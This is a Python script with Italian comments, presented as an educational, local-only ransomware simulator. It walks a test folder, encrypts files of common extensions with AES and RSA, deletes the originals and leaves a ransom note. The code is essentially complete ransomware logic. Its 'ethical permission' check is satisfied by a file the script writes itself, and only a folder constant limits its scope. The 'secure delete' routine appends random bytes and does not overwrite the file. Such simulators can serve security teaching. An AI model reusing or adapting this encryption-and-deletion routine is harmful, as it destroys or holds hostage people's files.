import os
import sys
import secrets
from datetime import datetime
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

### 🔐 CONFIGURAZIONE ###
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # Cartella dello script
TEST_DIR = os.path.join(SCRIPT_DIR, "RANSOMWARE_SIMULATION_TEST")  # Cartella di test locale
TARGET_EXTENSIONS = [".txt", ".docx", ".pdf", ".jpg"]  # Estensioni da cifrare
RANSOM_NOTE = "LEGGIMI_DECRIPTARE.txt"  # File con istruzioni

### 🛡️ CONTROLLI ETICI ###
def verifica_ambiente_sicuro():
    """Blocca l'esecuzione se mancano i requisiti etici."""
    if not os.path.exists(os.path.join(TEST_DIR, "PERMESSO_ETICO.txt")):
        print("⛔ MANCA FILE DI SICUREZZA! Crea 'PERMESSO_ETICO.txt' nella cartella di test.")
        sys.exit(1)

def crea_permesso_etico():
    """Crea il file che autorizza l'esecuzione."""
    with open(os.path.join(TEST_DIR, "PERMESSO_ETICO.txt"), "w") as f:
        f.write("⚠️ ATTENZIONE: USO DIDATTICO ⚠️\n")
        f.write(f"Utente: {os.getlogin()}\n")
        f.write(f"Data: {datetime.now().isoformat()}\n")
        f.write("Autorizzo l'uso di questo script per scopi educativi.\n")

### 📄 CREAZIONE FILE DI TEST ###
def crea_file_di_test():
    """Crea un file di test con contenuto dimostrativo."""
    test_file = os.path.join(TEST_DIR, "test.txt")
    with open(test_file, "w") as f:
        f.write("file di test da criptare")
    print(f"📄 Creato file di test: {test_file}")

### 🔑 GENERAZIONE CHIAVI ###
def genera_chiavi_rsa():
    """Crea coppia di chiavi RSA-2048."""
    chiave_privata = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    # Salva chiave privata
    with open(os.path.join(TEST_DIR, "private_key.pem"), "wb") as f:
        f.write(chiave_privata.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    
    return chiave_privata.public_key()

### 🔒 CRITTOGRAFIA FILE ###
def cifra_file_aes(file_path, chiave_aes):
    """Cifra un file con AES-256-CBC."""
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(chiave_aes), modes.CBC(iv), backend=default_backend())
    
    with open(file_path, "rb") as f:
        dati_originali = f.read()
    
    # Aggiunge padding
    padder = sym_padding.PKCS7(128).padder()
    dati_paddati = padder.update(dati_originali) + padder.finalize()
    
    # Cifra
    encryptor = cipher.encryptor()
    dati_cifrati = encryptor.update(dati_paddati) + encryptor.finalize()
    
    # Sovrascrive il file
    with open(file_path + ".encrypted", "wb") as f:
        f.write(iv + dati_cifrati)
    
    # Cancella l'originale in modo sicuro
    sovrascrivi_e_cancella(file_path)

def sovrascrivi_e_cancella(file_path):
    """Sovrascrive il file 3 volte prima di cancellarlo."""
    try:
        with open(file_path, "ba+") as f:
            length = f.tell()
            for _ in range(3):
                f.seek(0)
                f.write(secrets.token_bytes(length))
        os.remove(file_path)
    except Exception as e:
        print(f"❌ Errore cancellazione {file_path}: {e}")

### 📜 RANSOM NOTE ###
def crea_ransom_note():
    """Genera il file con le istruzioni (simulate)."""
    testo = f"""⚠️ ATTENZIONE! I TUOI FILE SONO STATI CRIPTATI! ⚠️

Questo è un esperimento didattico. Per decifrare:
1. Usa 'private_key.pem' e 'mydecrypt.py'
2. NON DISTRUGGERE I FILE .encrypted

🔐 Ricorda: questo è solo per studio della sicurezza!
"""
    with open(os.path.join(TEST_DIR, RANSOM_NOTE), "w") as f:
        f.write(testo)

### 🚀 MAIN ###
if __name__ == "__main__":
    print("=== SIMULATORE RANSOMWARE (LOCALE) ===")
    print(f"📁 Cartella di test: {TEST_DIR}")
    
    # Verifica se la cartella di test esiste già
    if os.path.exists(TEST_DIR):
        print("⚠️ ATTENZIONE: La cartella di test esiste già!")
        scelta = input("Vuoi continuare sovrascrivendo i file esistenti? (s/n): ").lower()
        if scelta != 's':
            print("Operazione annullata.")
            sys.exit(0)
    else:
        os.makedirs(TEST_DIR)
        print("✅ Cartella di test creata")
    
    # Crea file di autorizzazione
    crea_permesso_etico()
    verifica_ambiente_sicuro()
    
    # Crea file di test
    crea_file_di_test()
    
    # Genera chiave AES casuale (256 bit)
    chiave_aes = secrets.token_bytes(32)
    
    # Cifra la chiave AES con RSA
    chiave_pubblica = genera_chiavi_rsa()
    chiave_aes_cifrata = chiave_pubblica.encrypt(
        chiave_aes,
        padding.OAEP(
            mgf=padding.MGF1(hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    # Salva la chiave AES cifrata
    with open(os.path.join(TEST_DIR, "encrypted_aes_key.bin"), "wb") as f:
        f.write(chiave_aes_cifrata)
    
    # Cifra i file nella cartella di test
    for root, _, files in os.walk(TEST_DIR):
        for file in files:
            if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                file_path = os.path.join(root, file)
                print(f"🔒 Cifrando {file}...")
                cifra_file_aes(file_path, chiave_aes)
    
    crea_ransom_note()
    print("\n💀 SIMULAZIONE COMPLETATA!")
    print(f"📜 Leggi le istruzioni in: {RANSOM_NOTE}")